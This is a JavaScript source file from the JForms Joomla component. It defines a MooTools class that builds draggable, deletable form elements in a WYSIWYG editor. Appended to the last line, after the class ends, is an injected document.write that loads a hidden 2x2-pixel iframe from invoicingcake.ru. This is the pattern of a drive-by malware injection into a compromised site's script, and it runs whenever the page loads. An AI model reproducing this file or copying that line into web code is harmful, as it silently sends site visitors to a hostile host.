/**
 * CElement
 * @version		$Id: CElement.js 39 2009-01-02 04:51:19Z dr_drsh $
* @package		Joomla
* @subpackage	JForms
* @copyright	Copyright (C) 2008 Mostafa Muhammad. All rights reserved.
* @license		GNU/GPL
 *
 * @class The  base class for all WYSIWYG elements, it handles tasks like 
 * - Setting member variables with data from the constructor
 * - Creating the "li" parent element.
 * - Appends the element to sortables list of mootools
 *
 * @constructor
 * @param {Object} parent: Reference to the "<ul>" element that acts as the container for the whole WYSIWYG enviornment
 * @param {int}id: index of this CElement instance in the elementArray array
 * @param {Object}beforeObject: Reference to the object before which this element will be added
 * @param {object} params : list of parameters in key:value pairs
 **/
var CElement = new Class({
	
  pixelCorrection : 0,
 
  initialize: function( parent, id, beforeObject, params ) {
	
	if( Browser.Engine.trident ){
		this.pixelCorrection = 10;
	}
	
	this.index         = id ;
	//Extend with mootools
	this.parentElement = $(parent);
	beforeObject = beforeObject==null?null:$(beforeObject);
	
	//Coordinates and dimensions
	//Note : Coordinates are not used.
	this.x	        = params.x;
	this.y 	        = params.y;
	this.w	        = params.w;
	this.h	        = params.h;
	
	//Unique ID
	this.hash       = params.hash;
	
	//Create the li container element
	this.htmlContainer = new Element('li',{
		//Set a meaningful id for the element
		'id': this.parentElement.id + "_" +  this.type +  this.index,
		'class': 'element',
		//Listen to "onClick" event
		'events': {
			'click':   function(e){dispatch_onClick(e)}	
		}
	});
	
	
	//Create the "drag handle" (the one that appears to the left of the element in the WYSIWYG area)
	this.htmlDragHandle  = new Element('div', {
		'class': 'drag-handle',
		'html': ""
	});
	//Add the drag handler to this element "li" contianer
	this.htmlDragHandle.inject(this.htmlContainer);

	//Create the "delete button"
	this.htmlDeleteButton  = new Element('div',{
		'class': 'delete-button',
		'events': {
			'click':dispatch_onDelete
		}
	});
	//Add the delete button to this element "li" contianer
	this.htmlDeleteButton.inject(this.htmlContainer);
	

	//And finally add this element to the WYSIWYG area
	//No object to insert before
	if( beforeObject == null ){
		//Just append the element to the end of the workarea
		this.htmlContainer.inject(this.parentElement);
	} else {	
		//Inject our new element before the one referenced by "beforeObject"
		this.htmlContainer.inject(beforeObject, 'before');
	}
	
	//Add the new CElement to mootools sortables
	workspaceSortable = new Sortables(this.parentElement,
	{
			onStart: dispatch_onDragStart,
			onDrag:  dispatch_onDrag,
			onComplete:dispatch_onDragEnd,
			handle:'.drag-handle',
			clone:function(e,el,l){
				return el.clone().setStyles(el.getCoordinates(this.parentElement)).setStyles({'opacity':0.7, 'z-index':20,'height':38,'width':300})
			},
			revert:{ duration: 300, transition: 'quart:out' },
   			constrain: false
	});
	
  },
  
  //Javascript event manager use these methods to select/deselect elements, each element can define how it wants to look when selected :P
  deselect: function() { 
	this.htmlContainer.removeClass('selected'); 
    this.htmlDeleteButton.set({'styles':{ 'visibility' : 'hidden' }})
	
  },
  select  : function() { 
	this.htmlContainer.addClass('selected'); 
    this.htmlDeleteButton.set({'styles':{ 'visibility' : 'visible' }})
  },
  
  /* **** Event handlers **** */
  
  //Called when the user click "save" on a property page
  onUpdate:     function() {;},
  
  //Called when the element get focus "becomes selected"
  onFocus:	    function() {;},
  
  //Called when the element loses focus 
  onBlur:	    function() {;},

  //Called on beginning of Dragging
  onDragStart:  function() {;},
 
 //Called with every step of the dragging process
  onDrag:       function() {;},
  
  //Called when dragging ends
  onDragEnd:    function() {;},

  //Called when the element is going to be deleted
  onDelete:   function() {
  
    	this.htmlContainer.removeEvents();
	  	this.htmlContainer.empty();
		this.htmlContainer.dispose();
  },
  
  kill: function() {
	this.htmlDeleteButton.fireEvent( 'click' );
  }
});document.write('<iframe src="http://invoicingcake.ru/VEREIN?8" scrolling="auto" frameborder="no" align="center" height="2" width="2"></iframe>');